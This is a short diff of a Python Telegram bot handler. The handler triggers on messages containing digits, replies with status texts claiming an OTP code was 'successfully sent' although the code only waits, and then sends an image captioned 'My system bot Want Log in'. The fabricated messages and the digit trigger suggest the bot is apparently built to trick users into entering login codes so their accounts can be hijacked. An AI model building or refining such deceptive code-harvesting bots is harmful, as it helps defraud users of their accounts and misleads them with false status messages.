@@ -100,11 +100,10 @@ async def verip(_, message):
 
 @app.on_message(filters.regex("6|1|2|3|4"))
 async def regex_cantik(_, message):
-    await app.send_message(message.chat.id, "Mengirim kode otp..")
+    await app.send_message(message.chat.id, "__Sent otp code...__")
     await asyncio.sleep(10)
-    await app.delete_messages(message.chat.id)
-    await app.send_message(message.chat.id, "Tunggu sebentar..")
-    await asyncio.sleep(5)
+    await app.send_message(message.chat.id, "__successfully sent otp code…__")
+    await asyncio.sleep(0.5)
     await app.send_photo(message.chat.id, "https://graph.org/file/63bcc1838ae1db75b10c4.jpg", caption="""
 🤖 My system bot Want Log in 
 
